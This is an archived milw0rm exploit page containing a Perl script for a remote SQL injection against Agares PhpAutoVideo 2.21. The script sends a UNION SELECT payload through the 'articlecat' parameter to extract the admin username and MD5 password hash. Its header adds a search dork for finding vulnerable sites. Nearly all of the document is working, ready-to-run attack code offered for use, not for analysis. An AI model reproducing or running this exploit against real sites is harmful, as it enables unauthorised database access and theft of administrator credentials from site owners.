<html><head><title>Agares PhpAutoVideo 2.21 (articlecat) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Agares PhpAutoVideo 2.21 (articlecat) Remote SQL Injection Exploit
#Bug Found by ka0x ( http://milw0rm.org/exploits/4901 ).. but sql injection works if we include in index.php bug file with sql injection..like this :
#http://192.168.1.102/video/UPLOAD/index.php?loadpage=./includes/articleblock.php&amp;articlecat=[SQL]
#So.. we can execute sql query and we have user admin &amp; pass in MD5
#Exploit by Pr0metheus
#Gr33tz to Gr33tz-Team.org
#Dork : &quot;powered by AMCMS3&quot;
###############################################
use LWP::UserAgent;
if(@ARGV!=3){
	print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
	print &quot;Agares PhpAutoVideo 2.21 Remote Sql Injection\n&quot;;
	print &quot;perl $0 &lt;site&gt; &lt;path&gt; &lt;prefix&gt;\n&quot;;
    print &quot;default prefix - amcms\n&quot;;
	print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
}
($site,$path,$prefix)=@ARGV;
$file  = &quot;index.php?loadpage=./includes/articleblock.php&amp;articlecat=&quot;;
$query = &quot;1+and+1=2+UNION+SELECT+userkey,username,password,4,5,6,7,8,9,10+from+&quot;.$prefix.&quot;_users+where+userkey=1/*&quot;;
$ua = new LWP::UserAgent;
$ua-&gt;agent(&quot;Mozilla/8.0&quot;);
$ua = LWP::UserAgent-&gt;new;
my $req = HTTP::Request-&gt;new(GET =&gt; &quot;&quot;.$site.&quot;&quot;.$path.&quot;&quot;.$file.&quot;&quot;.$query.&quot;&quot;);
$req-&gt;header('Accept' =&gt; 'text/html');
$res = $ua-&gt;request($req);
$con = $res-&gt;content;
if($con =~ /&lt;p&gt;(.*)&lt;\/p&gt;/){
	$p = $1;
	print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
	print &quot;Agares PhpAutoVideo 2.21 Remote Sql Injection\n\n&quot;;
	print &quot;[+] Admin Pass : &quot;.$p.&quot;\n&quot;;
	
	if($con =~/&quot;&gt;(.*)&lt;\/a&gt;&lt;\/h1&gt;/){
		$u = $1;
		print &quot;[+] Admin Username : &quot;.$u.&quot;\n&quot;;
		print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
	
	}
	else{
		print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
		print &quot;Agares PhpAutoVideo 2.21 Remote Sql Injection\n\n&quot;;
		print &quot;[+] Exploit Failed...\n&quot;;
		print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
	}
}
else{
	print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
	print &quot;Agares PhpAutoVideo 2.21 Remote Sql Injection\n\n&quot;;
	print &quot;[+] Exploit Failed...\n&quot;;
	print &quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n&quot;;
}

# milw0rm.com [2008-01-13]</pre></html>